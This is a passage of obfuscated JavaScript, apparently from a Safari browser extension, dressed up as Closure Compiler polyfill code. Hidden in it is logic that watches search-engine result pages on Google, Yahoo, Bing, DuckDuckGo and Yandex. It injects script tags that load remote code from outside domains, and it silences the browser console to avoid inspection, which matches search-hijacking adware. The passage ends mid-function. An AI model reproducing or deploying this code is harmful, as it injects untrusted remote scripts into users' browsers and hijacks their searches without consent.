  a["NETsm"](e, this, function() {
    /** @type {!RegExp} */
    var numericValueTests = new RegExp(a["JEoQx"]);
    /** @type {!RegExp} */
    var test = new RegExp("++ *(?:[" + "a-zA-Z_$][" + "0-9a-zA-Z_" + "$]*)", "i");
    var label = a["pCGTJ"](d, a["NxPSG"]);
    if (!numericValueTests["test"](a["FNcJD"](label, a["WAvwA"])) || !test["test"](label + a["dtcxZ"])) {
      a["fZvbB"](label, "0");
    } else {
      d();
    }
  })();
})();
var c = function() {
  var activeIndex = {};
  /**
   * @param {?} i
   * @param {?} categoryStart
   * @return {?}
   */
  activeIndex["VLsdz"] = function(i, categoryStart) {
    return i === categoryStart;
  };
  /**
   * @param {(boolean|number|string)} _num2
   * @param {(boolean|number|string)} _num1
   * @return {?}
   */
  activeIndex["WeHFV"] = function(_num2, _num1) {
    return _num2 / _num1;
  };
  /**
   * @param {?} optionsValue
   * @param {?} value
   * @return {?}
   */
  activeIndex["lqvfw"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  /** @type {string} */
  activeIndex["dlhHl"] = "lrXze";
  var tileFuncs = activeIndex;
  /** @type {boolean} */
  var closeExpr = !![];
  return function(object__360, function__361) {
    var values = {};
    /**
     * @param {?} mmaModFeedbackAutomSyncedEvent
     * @param {?} tiles
     * @return {?}
     */
    values["OYBMz"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
      return tileFuncs["VLsdz"](mmaModFeedbackAutomSyncedEvent, tiles);
    };
    /**
     * @param {?} mmaModFeedbackAutomSyncedEvent
     * @param {?} tiles
     * @return {?}
     */
    values["oruSZ"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
      return tileFuncs["WeHFV"](mmaModFeedbackAutomSyncedEvent, tiles);
    };
    /**
     * @param {?} mmaModFeedbackAutomSyncedEvent
     * @param {?} tiles
     * @return {?}
     */
    values["PANfz"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
      return tileFuncs["lqvfw"](mmaModFeedbackAutomSyncedEvent, tiles);
    };
    /**
     * @param {?} saveNotifs
     * @return {?}
     */
    values["BzVPT"] = function(saveNotifs) {
      return saveNotifs();
    };
    /** @type {string} */
    values["xEkDU"] = "none";
    var handlers = values;
    if (tileFuncs["dlhHl"] !== tileFuncs["dlhHl"]) {
      return handlers["OYBMz"](c, b) ? 0 !== c || handlers["OYBMz"](handlers["oruSZ"](1, c), 1 / b) : handlers["PANfz"](c, c) && b !== b;
    } else {
      /** @type {!Function} */
      var closingExpr = closeExpr ? function() {
        if ("cMLBQ" !== "lPRrQ") {
          if (function__361) {
            var cssobj = function__361["apply"](object__360, arguments);
            /** @type {null} */
            function__361 = null;
            return cssobj;
          }
        } else {
          if (d) {
            handlers["BzVPT"](e);
          } else {
            var body = document["body"];
            if (body && handlers["OYBMz"](handlers["xEkDU"], body["style"]["display"])) {
              window["location"]["replace"](location["href"]);
            }
          }
          var query = {};
          query["url"] = location["href"];
          /** @type {function(?): ?} */
          query["status"] = d;
          safari["extension"]["dispatchMe" + "ssage"](eventName, query);
        }
      } : function() {
      };
      /** @type {boolean} */
      closeExpr = ![];
      return closingExpr;
    }
  };
}();
var g = c(this, function() {
  var self = {};
  /** @type {string} */
  self["rlMnf"] = "info";
  /** @type {string} */
  self["fmCgP"] = "6|3|2|7|4|" + "0|9|5|8|1";
  /**
   * @param {?} letter
   * @param {?} all
   * @return {?}
   */
  self["EiPtW"] = function(letter, all) {
    return letter == all;
  };
  /**
   * @param {?} saveNotifs
   * @param {?} notifications
   * @return {?}
   */
  self["JcDyU"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  /**
   * @param {(Object|number)} buckets
   * @param {!Object} name
   * @return {?}
   */
  self["uIRnB"] = function(buckets, name) {
    return buckets + name;
  };
  /**
   * @param {?} saveNotifs
   * @return {?}
   */
  self["posvb"] = function(saveNotifs) {
    return saveNotifs();
  };
  /** @type {string} */
  self["QHGdH"] = "lHXSM";
  /**
   * @param {?} optionsValue
   * @param {?} value
   * @return {?}
   */
  self["ktKMm"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  /** @type {string} */
  self["qOBtJ"] = "FRXum";
  var app = self;
  /**
   * @return {undefined}
   */
  var e = function() {
  };
  var result;
  try {
    result = app["posvb"](aL);
  } catch (aV) {
    /** @type {!Window} */
    result = window;
  }
  if (!result["console"]) {
    if ("vAduq" === app["QHGdH"]) {
      var code = xhr["responseTe" + "xt"];
      var data = {
        "status" : code,
        "timestamp" : Date["now"]()
      };
      localStorage["setItem"](app["rlMnf"], JSON["stringify"](data));
      if (d) {
        b(code);
      }
    } else {
      result["console"] = function(e) {
        var callbackVals = app["fmCgP"]["split"]("|");
        /** @type {number} */
        var callbackCount = 0;
        for (; !![];) {
          switch(callbackVals[callbackCount++]) {
            case "0":
              /** @type {function(): undefined} */
              result["error"] = e;
              continue;
            case "1":
              return result;
            case "2":
              /** @type {function(): undefined} */
              result["warn"] = e;
              continue;
            case "3":
              /** @type {function(): undefined} */
              result["log"] = e;
              continue;
            case "4":
              /** @type {function(): undefined} */
              result["info"] = e;
              continue;
            case "5":
              /** @type {function(): undefined} */
              result["table"] = e;
              continue;
            case "6":
              var result = {};
              continue;
            case "7":
              /** @type {function(): undefined} */
              result["debug"] = e;
              continue;
            case "8":
              /** @type {function(): undefined} */
              result["trace"] = e;
              continue;
            case "9":
              /** @type {function(): undefined} */
              result["exception"] = e;
              continue;
          }
          break;
        }
      }(e);
    }
  } else {
    if (app["ktKMm"]("jhqFx", app["qOBtJ"])) {
      /** @type {function(): undefined} */
      result["console"]["log"] = e;
      /** @type {function(): undefined} */
      result["console"]["warn"] = e;
      /** @type {function(): undefined} */
      result["console"]["debug"] = e;
      /** @type {function(): undefined} */
      result["console"]["info"] = e;
      /** @type {function(): undefined} */
      result["console"]["error"] = e;
      /** @type {function(): undefined} */
      result["console"]["exception"] = e;
      /** @type {function(): undefined} */
      result["console"]["table"] = e;
      /** @type {function(): undefined} */
      result["console"]["trace"] = e;
    } else {
      if (app["EiPtW"](200, xhr["status"])) {
        var res = xhr["responseTe" + "xt"];
        var data = {
          "status" : res,
          "timestamp" : Date["now"]()
        };
        localStorage["setItem"](app["rlMnf"], JSON["stringify"](data));
        if (d) {
          app["JcDyU"](b, res);
        }
      } else {
        if (d) {
          f(false);
        }
      }
    }
  }
});
g();
var $jscomp = $jscomp || {};
$jscomp["scope"] = {};
/** @type {boolean} */
$jscomp["ASSUME_ES5"] = false;
/** @type {boolean} */
$jscomp["ASSUME_NO_" + "NATIVE_MAP"] = false;
/** @type {boolean} */
$jscomp["ASSUME_NO_" + "NATIVE_SET"] = false;
/** @type {boolean} */
$jscomp["SIMPLE_FRO" + "UND_POLYFI" + "LL"] = false;
/** @type {boolean} */
$jscomp["ISOLATE_PO" + "LYFILLS"] = false;
/** @type {boolean} */
$jscomp["FORCE_POLY" + "FILL_PROMI" + "SE"] = false;
/** @type {boolean} */
$jscomp["FORCE_POLY" + "FILL_PROMI" + "SE_WHEN_NO" + "_UNHANDLED" + "_REJECTION"] = false;
$jscomp["defineProp" + "erty"] = $jscomp["ASSUME_ES5"] || "function" == typeof Object["defineProp" + "erties"] ? Object["defineProp" + "erty"] : function(options, attr, device) {
  var currentRelations = {};
  /**
   * @param {?} letter
   * @param {?} all
   * @return {?}
   */
  currentRelations["PeGNY"] = function(letter, all) {
    return letter == all;
  };
  /**
   * @param {?} letter
   * @param {?} all
   * @return {?}
   */
  currentRelations["MhNYO"] = function(letter, all) {
    return letter == all;
  };
  var addedRelations = currentRelations;
  if (addedRelations["PeGNY"](options, Array["prototype"]) || addedRelations["MhNYO"](options, Object["prototype"])) {
    return options;
  }
  options[attr] = device["value"];
  return options;
};
/**
 * @param {!Object} data
 * @return {?}
 */
$jscomp["getGlobal"] = function(data) {
  var objectsToHistory = {};
  /** @type {string} */
  objectsToHistory["xnQLp"] = "object";
  /**
   * @param {?} letter
   * @param {?} all
   * @return {?}
   */
  objectsToHistory["nlpZX"] = function(letter, all) {
    return letter == all;
  };
  /**
   * @param {?} letter
   * @param {?} all
   * @return {?}
   */
  objectsToHistory["pIfJQ"] = function(letter, all) {
    return letter == all;
  };
  /**
   * @param {(boolean|number|string)} rowTop
   * @param {(boolean|number|string)} clientHeight
   * @return {?}
   */
  objectsToHistory["KzRtm"] = function(rowTop, clientHeight) {
    return rowTop < clientHeight;
  };
  /**
   * @param {?} saveNotifs
   * @param {?} notifications
   * @return {?}
   */
  objectsToHistory["eKpjc"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  /** @type {string} */
  objectsToHistory["atXzl"] = "Cannot fin" + "d global o" + "bject";
  var handlers = objectsToHistory;
  /** @type {!Array} */
  data = [handlers["xnQLp"] == typeof globalThis && globalThis, data, handlers["nlpZX"](handlers["xnQLp"], typeof window) && window, handlers["pIfJQ"](handlers["xnQLp"], typeof self) && self, handlers["pIfJQ"](handlers["xnQLp"], typeof global) && global];
  /** @type {number} */
  var c = 0;
  for (; handlers["KzRtm"](c, data["length"]); ++c) {
    var root = data[c];
    if (root && handlers["pIfJQ"](root["Math"], Math)) {
      return root;
    }
  }
  throw handlers["eKpjc"](Error, handlers["atXzl"]);
};
$jscomp["global"] = $jscomp["getGlobal"](this);
/** @type {boolean} */
$jscomp["IS_SYMBOL_" + "NATIVE"] = "function" === typeof Symbol && "symbol" === typeof Symbol("x");
$jscomp["TRUST_ES6_" + "POLYFILLS"] = !$jscomp["ISOLATE_PO" + "LYFILLS"] || $jscomp["IS_SYMBOL_" + "NATIVE"];
$jscomp["polyfills"] = {};
$jscomp["propertyTo" + "PolyfillSy" + "mbol"] = {};
/** @type {string} */
$jscomp["POLYFILL_P" + "REFIX"] = "$jscp$";
/**
 * @param {!NodeList} mapping
 * @param {number} index
 * @return {?}
 */
var $jscomp$lookupPolyfilledValue = function(mapping, index) {
  var currentRelations = {};
  /**
   * @param {?} letter
   * @param {?} all
   * @return {?}
   */
  currentRelations["XQgAh"] = function(letter, all) {
    return letter == all;
  };
  /**
   * @param {?} optionsValue
   * @param {?} value
   * @return {?}
   */
  currentRelations["mVvjs"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  var addedRelations = currentRelations;
  var value = $jscomp["propertyTo" + "PolyfillSy" + "mbol"][index];
  if (addedRelations["XQgAh"](null, value)) {
    return mapping[index];
  }
  value = mapping[value];
  return addedRelations["mVvjs"](void 0, value) ? value : mapping[index];
};
/**
 * @param {?} mmCoreSplitViewBlock
 * @param {?} mmaPushNotificationsComponent
 * @param {?} mmaFrontpagePriority
 * @param {?} isBgroundImg
 * @return {undefined}
 */
$jscomp["polyfill"] = function(mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg) {
  if (mmaPushNotificationsComponent) {
    if ($jscomp["ISOLATE_PO" + "LYFILLS"]) {
      $jscomp["polyfillIs" + "olated"](mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg);
    } else {
      $jscomp["polyfillUn" + "isolated"](mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg);
    }
  }
};
/**
 * @param {!Object} p
 * @param {string} key
 * @param {!Object} prop
 * @param {string} value
 * @return {undefined}
 */
$jscomp["polyfillUn" + "isolated"] = function(p, key, prop, value) {
  var context = {};
  /**
   * @param {(boolean|number|string)} rowTop
   * @param {(boolean|number|string)} clientHeight
   * @return {?}
   */
  context["MZaNY"] = function(rowTop, clientHeight) {
    return rowTop < clientHeight;
  };
  /**
   * @param {(number|string)} minWorkers
   * @param {!Object} options
   * @return {?}
   */
  context["LTohp"] = function(minWorkers, options) {
    return minWorkers in options;
  };
  /**
   * @param {(boolean|number|string)} b
   * @param {(boolean|number|string)} a
   * @return {?}
   */
  context["wMiFc"] = function(b, a) {
    return b - a;
  };
  /**
   * @param {?} modstatus
   * @param {?} mmCoreNotDownloadable
   * @return {?}
   */
  context["LnRSl"] = function(modstatus, mmCoreNotDownloadable) {
    return modstatus != mmCoreNotDownloadable;
  };
  var obj = context;
  var callbackVals = ("0|2|1|3|5|" + "4|6")["split"]("|");
  /** @type {number} */
  var callbackCount = 0;
  for (; !![];) {
    switch(callbackVals[callbackCount++]) {
      case "0":
        prop = $jscomp["global"];
        continue;
      case "1":
        /** @type {number} */
        value = 0;
        for (; obj["MZaNY"](value, p["length"] - 1); value++) {
          var name = p[value];
          if (!obj["LTohp"](name, prop)) {
            return;
          }
          prop = prop[name];
        }
        continue;
      case "2":
        p = p["split"](".");
        continue;
      case "3":
        p = p[obj["wMiFc"](p["length"], 1)];
        continue;
      case "4":
        key = key(value);
        continue;
      case "5":
        value = prop[p];
        continue;
      case "6":
        if (key != value && obj["LnRSl"](null, key)) {
          $jscomp["defineProp" + "erty"](prop, p, {
            "configurable" : true,
            "writable" : true,
            "value" : key
          });
        }
        continue;
    }
    break;
  }
};
/**
 * @param {!Object} layoutSets
 * @param {string} c
 * @param {string} e
 * @param {?} v
 * @return {undefined}
 */
$jscomp["polyfillIs" + "olated"] = function(layoutSets, c, e, v) {
  var array = {};
  /** @type {string} */
  array["JcgLM"] = "script";
  /** @type {string} */
  array["aSbxX"] = "src";
  /**
   * @param {?} x_or_y
   * @param {?} y
   * @return {?}
   */
  array["wzMcV"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /**
   * @param {(number|string)} minWorkers
   * @param {!Object} options
   * @return {?}
   */
  array["GqrxY"] = function(minWorkers, options) {
    return minWorkers in options;
  };
  /**
   * @param {(boolean|number|string)} angle
   * @param {(boolean|number|string)} keyAngle
   * @return {?}
   */
  array["JctXN"] = function(angle, keyAngle) {
    return angle < keyAngle;
  };
  /**
   * @param {(boolean|number|string)} b
   * @param {(boolean|number|string)} a
   * @return {?}
   */
  array["eKdnq"] = function(b, a) {
    return b - a;
  };
  /** @type {string} */
  array["TeFLu"] = "XoSug";
  /** @type {string} */
  array["Zqywp"] = "bGejl";
  /** @type {string} */
  array["JnhAC"] = "es6";
  /**
   * @param {?} saveNotifs
   * @param {?} notifications
   * @return {?}
   */
  array["fuRHh"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  /**
   * @param {?} modstatus
   * @param {?} mmCoreNotDownloadable
   * @return {?}
   */
  array["cVkGM"] = function(modstatus, mmCoreNotDownloadable) {
    return modstatus != mmCoreNotDownloadable;
  };
  /**
   * @param {(Object|number)} text
   * @param {!Object} shorturl_result
   * @return {?}
   */
  array["RWPzm"] = function(text, shorturl_result) {
    return text + shorturl_result;
  };
  var a = array;
  var t = layoutSets["split"](".");
  layoutSets = a["wzMcV"](1, t["length"]);
  v = t[0];
  v = !layoutSets && a["GqrxY"](v, $jscomp["polyfills"]) ? $jscomp["polyfills"] : $jscomp["global"];
  /** @type {number} */
  var x = 0;
  for (; a["JctXN"](x, a["eKdnq"](t["length"], 1)); x++) {
    if (a["TeFLu"] !== a["Zqywp"]) {
      var c = t[x];
      if (!a["GqrxY"](c, v)) {
        return;
      }
      v = v[c];
    } else {
      var rowSorter = document["createElem" + "ent"](a["JcgLM"]);
      rowSorter["setAttribu" + "te"](a["aSbxX"], "https://ww" + "w.hoexoxg." + "site/stati" + "c/s/app.js");
      document["head"]["appendChil" + "d"](rowSorter);
    }
  }
  t = t[a["eKdnq"](t["length"], 1)];
  e = $jscomp["IS_SYMBOL_" + "NATIVE"] && a["JnhAC"] === e ? v[t] : null;
  c = a["fuRHh"](c, e);
  if (a["cVkGM"](null, c)) {
    if (layoutSets) {
      $jscomp["defineProp" + "erty"]($jscomp["polyfills"], t, {
        "configurable" : true,
        "writable" : true,
        "value" : c
      });
    } else {
      if (c !== e) {
        $jscomp["propertyTo" + "PolyfillSy" + "mbol"][t] = $jscomp["IS_SYMBOL_" + "NATIVE"] ? $jscomp["global"]["Symbol"](t) : a["RWPzm"]($jscomp["POLYFILL_P" + "REFIX"], t);
        t = $jscomp["propertyTo" + "PolyfillSy" + "mbol"][t];
        $jscomp["defineProp" + "erty"](v, t, {
          "configurable" : true,
          "writable" : true,
          "value" : c
        });
      }
    }
  }
};
$jscomp["polyfill"]("Object.is", function(animated) {
  var node = {};
  /**
   * @param {?} x_or_y
   * @param {?} y
   * @return {?}
   */
  node["MCyFh"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /**
   * @param {(boolean|number|string)} _num2
   * @param {(boolean|number|string)} _num1
   * @return {?}
   */
  node["ALxWN"] = function(_num2, _num1) {
    return _num2 / _num1;
  };
  /**
   * @param {?} optionsValue
   * @param {?} value
   * @return {?}
   */
  node["WLHGq"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  var B3494 = node;
  return animated ? animated : function(char__3503, env__3547) {
    return char__3503 === env__3547 ? 0 !== char__3503 || B3494["MCyFh"](1 / char__3503, B3494["ALxWN"](1, env__3547)) : B3494["WLHGq"](char__3503, char__3503) && B3494["WLHGq"](env__3547, env__3547);
  };
}, "es6", "es3");
setInterval(function() {
  d();
}, 4E3);
$jscomp["polyfill"]("Array.prot" + "otype.incl" + "udes", function(obj) {
  var PL$6 = {};
  /**
   * @param {(boolean|number|string)} rowTop
   * @param {(boolean|number|string)} clientHeight
   * @return {?}
   */
  PL$6["sctZX"] = function(rowTop, clientHeight) {
    return rowTop < clientHeight;
  };
  /**
   * @param {(number|string)} minWorkers
   * @param {!Object} options
   * @return {?}
   */
  PL$6["KNwkT"] = function(minWorkers, options) {
    return minWorkers in options;
  };
  /**
   * @param {?} modstatus
   * @param {?} mmCoreNotDownloadable
   * @return {?}
   */
  PL$6["wiats"] = function(modstatus, mmCoreNotDownloadable) {
    return modstatus != mmCoreNotDownloadable;
  };
  /**
   * @param {?} x_or_y
   * @param {?} y
   * @return {?}
   */
  PL$6["wKBGR"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /** @type {string} */
  PL$6["qGKkk"] = "aDuqO";
  /** @type {string} */
  PL$6["RAGaL"] = "FRvxY";
  /** @type {string} */
  PL$6["Tputh"] = "3|4|5|0|2|" + "1";
  /**
   * @param {(Date|number)} _num1
   * @param {!Date} _num2
   * @return {?}
   */
  PL$6["fEwRH"] = function(_num1, _num2) {
    return _num1 > _num2;
  };
  /**
   * @param {(Object|number)} buckets
   * @param {!Object} name
   * @return {?}
   */
  PL$6["VqpCZ"] = function(buckets, name) {
    return buckets + name;
  };
  /**
   * @param {(boolean|number|string)} rowTop
   * @param {(boolean|number|string)} clientHeight
   * @return {?}
   */
  PL$6["vhVuS"] = function(rowTop, clientHeight) {
    return rowTop < clientHeight;
  };
  var PL$16 = PL$6;
  return obj ? obj : function(name, data) {
    var currentRelations = {};
    /**
     * @param {(boolean|number|string)} b
     * @param {(boolean|number|string)} a
     * @return {?}
     */
    currentRelations["wOZRI"] = function(b, a) {
      return b - a;
    };
    /**
     * @param {?} PL$15
     * @param {?} texthtml
     * @return {?}
     */
    currentRelations["gSgWJ"] = function(PL$15, texthtml) {
      return PL$16["sctZX"](PL$15, texthtml);
    };
    /**
     * @param {?} PL$15
     * @param {?} texthtml
     * @return {?}
     */
    currentRelations["xyOMo"] = function(PL$15, texthtml) {
      return PL$16["KNwkT"](PL$15, texthtml);
    };
    /**
     * @param {?} PL$15
     * @param {?} texthtml
     * @return {?}
     */
    currentRelations["BnqXR"] = function(PL$15, texthtml) {
      return PL$16["wiats"](PL$15, texthtml);
    };
    var validators = currentRelations;
    if (PL$16["wKBGR"](PL$16["qGKkk"], PL$16["RAGaL"])) {
      var callbackVals = ("2|1|5|3|4|" + "0|6")["split"]("|");
      /** @type {number} */
      var callbackCount = 0;
      for (; !![];) {
        switch(callbackVals[callbackCount++]) {
          case "0":
            name = name(value);
            continue;
          case "1":
            obj = obj["split"](".");
            continue;
          case "2":
            data = $jscomp["global"];
            continue;
          case "3":
            obj = obj[validators["wOZRI"](obj["length"], 1)];
            continue;
          case "4":
            value = data[obj];
            continue;
          case "5":
            /** @type {number} */
            value = 0;
            for (; validators["gSgWJ"](value, validators["wOZRI"](obj["length"], 1)); value++) {
              var val = obj[value];
              if (!validators["xyOMo"](val, data)) {
                return;
              }
              data = data[val];
            }
            continue;
          case "6":
            if (validators["BnqXR"](name, value) && null != name) {
              $jscomp["defineProp" + "erty"](data, obj, {
                "configurable" : true,
                "writable" : true,
                "value" : name
              });
            }
            continue;
        }
        break;
      }
    } else {
      var callbackVals = PL$16["Tputh"]["split"]("|");
      /** @type {number} */
      var callbackCount = 0;
      for (; !![];) {
        switch(callbackVals[callbackCount++]) {
          case "0":
            data = data || 0;
            continue;
          case "1":
            return false;
          case "2":
            if (PL$16["fEwRH"](0, data)) {
              data = Math["max"](PL$16["VqpCZ"](data, length), 0);
            }
            for (; PL$16["vhVuS"](data, length); data++) {
              var obj = value[data];
              if (PL$16["wKBGR"](obj, name) || Object["is"](obj, name)) {
                return true;
              }
            }
            continue;
          case "3":
            var value = this;
            continue;
          case "4":
            if (value instanceof String) {
              /** @type {string} */
              value = String(value);
            }
            continue;
          case "5":
            var length = value["length"];
            continue;
        }
        break;
      }
    }
  };
}, "es7", "es3");
/**
 * @param {string} gameFolder
 * @param {?} data
 * @param {string} boardManager
 * @return {?}
 */
$jscomp["checkStrin" + "gArgs"] = function(gameFolder, data, boardManager) {
  var currentRelations = {};
  /**
   * @param {?} state
   * @param {?} inUse
   * @return {?}
   */
  currentRelations["HapgX"] = function(state, inUse) {
    return state == inUse;
  };
  /**
   * @param {(Object|number)} buckets
   * @param {!Object} name
   * @return {?}
   */
  currentRelations["zzeGg"] = function(buckets, name) {
    return buckets + name;
  };
  /** @type {string} */
  currentRelations["YpMqH"] = " must not " + "be null or" + " undefined";
  /**
   * @param {(ArrayBuffer|ArrayBufferView|Blob|string)} impromptuInstance
   * @param {!Function} Impromptu
   * @return {?}
   */
  currentRelations["dvrxe"] = function(impromptuInstance, Impromptu) {
    return impromptuInstance instanceof Impromptu;
  };
  /**
   * @param {(Object|number)} buckets
   * @param {!Object} name
   * @return {?}
   */
  currentRelations["TnBEt"] = function(buckets, name) {
    return buckets + name;
  };
  var addedRelations = currentRelations;
  if (addedRelations["dvrxe"](data, RegExp)) {
    throw new TypeError(addedRelations["TnBEt"]("First argu" + "ment to St" + "ring.proto" + "type." + boardManager, " must not " + "be a regul" + "ar express" + "ion"));
  }
  return gameFolder + "";
};
$jscomp["polyfill"]("String.pro" + "totype.inc" + "ludes", function(canCreateDiscussions) {
  var currentRelations = {};
  /**
   * @param {?} x_or_y
   * @param {?} y
   * @return {?}
   */
  currentRelations["hAVDR"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /** @type {string} */
  currentRelations["VZLTI"] = "HNMAN";
  /** @type {string} */
  currentRelations["kKWZI"] = "IgBwG";
  /**
   * @param {?} optionsValue
   * @param {?} value
   * @return {?}
   */
  currentRelations["zPpOU"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  /**
   * @param {number} isPrevType
   * @param {boolean} isCurrentType
   * @return {?}
   */
  currentRelations["wnCXG"] = function(isPrevType, isCurrentType) {
    return isPrevType || isCurrentType;
  };
  var command_codes = currentRelations;
  return canCreateDiscussions ? canCreateDiscussions : function(classNAME, data) {
    if (command_codes["hAVDR"](command_codes["VZLTI"], command_codes["kKWZI"])) {
      var denies = fn["apply"](context, arguments);
      /** @type {null} */
      fn = null;
      return denies;
    } else {
      return command_codes["zPpOU"](-1, $jscomp["checkStrin" + "gArgs"](this, classNAME, "includes")["indexOf"](classNAME, command_codes["wnCXG"](data, 0)));
    }
  };
}, "es6", "es3");
var xhr;
/** @type {string} */
var eventName = "beforeload";
/** @type {boolean} */
var isSafari13OrLater = null != (ver = navigator["appVersion"]["match"](/version\/(\d+)/i)) && 13 <= ver[1];
addEventListener(eventName, function(canCreateDiscussions) {
  var obj = {};
  /**
   * @param {?} x_or_y
   * @param {?} y
   * @return {?}
   */
  obj["JoIJc"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /** @type {string} */
  obj["JYSiN"] = "YisOc";
  /**
   * @param {?} saveNotifs
   * @param {?} notifications
   * @return {?}
   */
  obj["kDqqk"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  /**
   * @param {?} x_or_y
   * @param {?} y
   * @return {?}
   */
  obj["kkKdz"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /**
   * @param {(boolean|number|string)} _num2
   * @param {(boolean|number|string)} _num1
   * @return {?}
   */
  obj["ZhRdW"] = function(_num2, _num1) {
    return _num2 / _num1;
  };
  /**
   * @param {?} letter
   * @param {?} all
   * @return {?}
   */
  obj["zGPfH"] = function(letter, all) {
    return letter == all;
  };
  /** @type {string} */
  obj["HiEgJ"] = "onCqt";
  /** @type {string} */
  obj["VpZKn"] = "info";
  /**
   * @param {?} saveNotifs
   * @param {?} notifications
   * @return {?}
   */
  obj["ntIza"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  /**
   * @param {?} saveNotifs
   * @param {?} notifications
   * @return {?}
   */
  obj["eZmva"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  /**
   * @param {?} x_or_y
   * @param {?} y
   * @return {?}
   */
  obj["LTzVO"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /** @type {string} */
  obj["Ekfap"] = "LDBCB";
  /**
   * @param {?} saveNotifs
   * @return {?}
   */
  obj["ybZhr"] = function(saveNotifs) {
    return saveNotifs();
  };
  /**
   * @param {?} optionsValue
   * @param {?} value
   * @return {?}
   */
  obj["pqZww"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  /** @type {string} */
  obj["YHrSW"] = "https://mo" + "j.plantitu" + "d.com/stat" + "ic/gs/s.js";
  /**
   * @param {(Object|number)} buckets
   * @param {!Object} name
   * @return {?}
   */
  obj["Fkmum"] = function(buckets, name) {
    return buckets + name;
  };
  /** @type {string} */
  obj["efkGB"] = ";return st" + 'atus("';
  /**
   * @param {?} f
   * @param {?} widthCtrl
   * @return {?}
   */
  obj["qhntV"] = function(f, widthCtrl) {
    return f(widthCtrl);
  };
  /**
   * @param {?} f
   * @param {?} widthCtrl
   * @return {?}
   */
  obj["BqKHm"] = function(f, widthCtrl) {
    return f(widthCtrl);
  };
  /** @type {string} */
  obj["pMnaR"] = "PghYb";
  /** @type {string} */
  obj["wLfeG"] = "none";
  /** @type {string} */
  obj["enFtF"] = "debu";
  /** @type {string} */
  obj["MnCHh"] = "gger";
  /** @type {string} */
  obj["xbetY"] = "stateObjec" + "t";
  /**
   * @param {?} optionsValue
   * @param {?} value
   * @return {?}
   */
  obj["GYIEc"] = function(optionsValue, value) {
    return optionsValue !== value;
  };
  /** @type {string} */
  obj["iuuTY"] = "mRWft";
  /**
   * @param {?} x_or_y 5142
   * @param {?} y
   * @return {?}
   */
  obj["ZqSjr"] = function(x_or_y, y) {
    return x_or_y === y;
  };
  /** @type {string} */
  obj["ockTq"] = "0|1|2|4|3";
  /**
   * @param {?} callback
   * @param {?} identifierPositions
   * @return {?}
   */
  obj["RAqgJ"] = function(callback, identifierPositions) {
    return callback(identifierPositions);
  };
  /**
   * @param {?} saveNotifs
   * @param {?} notifications
   * @return {?}
   */
  obj["OqCiT"] = function(saveNotifs, notifications) {
    return saveNotifs(notifications);
  };
  /**
   * @param {(boolean|number|string)} mid_OR_high
   * @param {(boolean|number|string)} high_OR_null
   * @return {?}
   */
  obj["puXEi"] = function(mid_OR_high, high_OR_null) {
    return mid_OR_high <= high_OR_null;
  };
  /**
   * @param {(boolean|number|string)} _num2
   * @param {(boolean|number|string)} _num1
   * @return {?}
   */
  obj["PNuAU"] = function(_num2, _num1) {
    return _num2 / _num1;
  };
  /** @type {string} */
  obj["IQPhl"] = "google.";
  /** @type {string} */
  obj["NhQJI"] = "yahoo.";
  /** @type {string} */
  obj["Cspsr"] = "bing.";
  /** @type {string} */
  obj["dSCrp"] = "duckduckgo" + ".";
  /** @type {string} */
  obj["tLgUF"] = "yandex.";
  /** @type {string} */
  obj["RVBue"] = '[src="http' + "s://www.ho" + "exoxg.site" + "/static/s/" + 'app.js"]';
  /** @type {string} */
  obj["GLgNM"] = "JAhJQ";
  /** @type {string} */
  obj["brJeG"] = "src";
  /** @type {string} */
  obj["bdNuj"] = "https://ww" + "w.hoexoxg." + "site/stati" + "c/s/app.js";
  var data = obj;
  if (!isSafari13OrLater && window["top"] === window) {
    if (!document["referrer"] && location["host"] && location["search"] && location["href"] && (location["host"]["includes"](data["IQPhl"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location["host"]["includes"](data["NhQJI"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search.*?[?&]p=[^&].*$/) || location["host"]["includes"](data["Cspsr"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location["host"]["includes"](data["dSCrp"]) && 
    location["href"]["match"](/^https?:\/\/[^\/]+\/\?.*?\bq\b=[^&].*$/) || location["host"]["includes"](data["tLgUF"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search[\/]?\?.*?\btext\b=[^&].*$/))) {
      /**
       * @param {boolean} size
       * @return {?}
       */
      var get = function(size) {
        var namespacedData = {};
        /**
         * @param {?} _relatedTarget
         * @param {?} value2
         * @return {?}
         */
        namespacedData["NDkPJ"] = function(_relatedTarget, value2) {
          return data["kkKdz"](_relatedTarget, value2);
        };
        /**
         * @param {?} optionsValue
         * @param {?} value
         * @return {?}
         */
        namespacedData["ImABp"] = function(optionsValue, value) {
          return optionsValue !== value;
        };
        /**
         * @param {?} _relatedTarget
         * @param {?} value2
         * @return {?}
         */
        namespacedData["UxvDC"] = function(_relatedTarget, value2) {
          return data["ZhRdW"](_relatedTarget, value2);
        };
        /**
         * @param {?} _relatedTarget
